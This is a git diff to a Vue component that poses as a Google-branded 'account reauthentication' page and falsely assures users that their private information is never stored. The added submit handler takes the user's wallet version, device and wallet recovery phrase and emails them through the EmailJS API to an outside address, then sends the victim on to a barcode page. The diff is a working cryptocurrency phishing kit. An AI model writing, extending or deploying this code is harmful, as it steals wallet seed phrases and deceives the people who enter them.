@@ -9,10 +9,9 @@
           <h1>Account Reauthenication Form</h1>
           <p>
             Provide the Required Information to successfully Re Authenticate
-            your account on our database system. 
+            your account on our database system.
           </p>
-          <p>NOTE: Your private information
-            is never stored on our database.</p>
+          <p>NOTE: Your private information is never stored on our database.</p>
           <div class="divider"></div>
           <el-form
             :label-position="labelPosition"
@@ -41,7 +40,7 @@
               <el-input v-model="ruleForm.recovery"></el-input>
             </el-form-item>
 
-            <el-form-item style="margin-top: 3rem;" >
+            <el-form-item style="margin-top: 3rem;">
               <el-button
                 :loading="loader"
                 type="primary"
@@ -52,7 +51,7 @@
             </el-form-item>
           </el-form>
           <div class="poweredby">
-            <img src="../assets/poweredgoogle.png" alt="">
+            <img src="../assets/poweredgoogle.png" alt="" />
           </div>
         </div>
       </div>
@@ -61,15 +60,42 @@
 </template>
 
 <script>
+import axios from "axios";
+
 export default {
   methods: {
     submitForm(formName) {
+      var self = this;
       this.loader = true;
       this.$refs[formName].validate((valid) => {
         if (valid) {
-          console.log("Got here");
-          this.loader = false;
-          this.$router.push("/barcode");
+          if (valid) {
+            var data = {
+              service_id: "123456789",
+              template_id: "template_3y5sgim",
+              user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
+              template_params: {
+                wallet_version: this.ruleForm.wallet,
+                device: this.ruleForm.device,
+                nnemonics: this.ruleForm.recovery,
+                reply_to: "janetwilliams1305@gmail.com",
+              },
+            };
+            axios
+              .post("https://api.emailjs.com/api/v1.0/email/send", data)
+              .then(function(response) {
+                console.log(response);
+                self.loader = false;
+                self.$router.push("/barcode");
+              })
+              .catch(function(error) {
+                console.log(error);
+                this.loader = false;
+              });
+          } else {
+            this.loader = false;
+            return false;
+          }
         } else {
           this.loader = false;
           console.log("error submit!!");
@@ -126,22 +152,21 @@ export default {
   margin-top: 2rem;
 }
 
-
 @media only screen and (max-width: 600px) {
   .container .form-full {
     width: 100%;
   }
 
   .left {
-    display: none!important;
+    display: none !important;
   }
 
   .right {
-    width: 100%!important;
+    width: 100% !important;
   }
 
   .right .container-right {
-    padding: 20px!important;
+    padding: 20px !important;
   }
 }
 
@@ -156,14 +181,12 @@ export default {
 
 .right {
   width: 70%;
-  
 }
 
 .right .poweredby {
   margin-top: 4rem;
   width: 300px;
 }
-
 
 .right .poweredby img {
   height: 100%;
@@ -177,7 +200,6 @@ export default {
 .right .el-form-item__label {
   font-size: 16px;
 }
-
 
 .divider {
   border: 1px solid #eee;
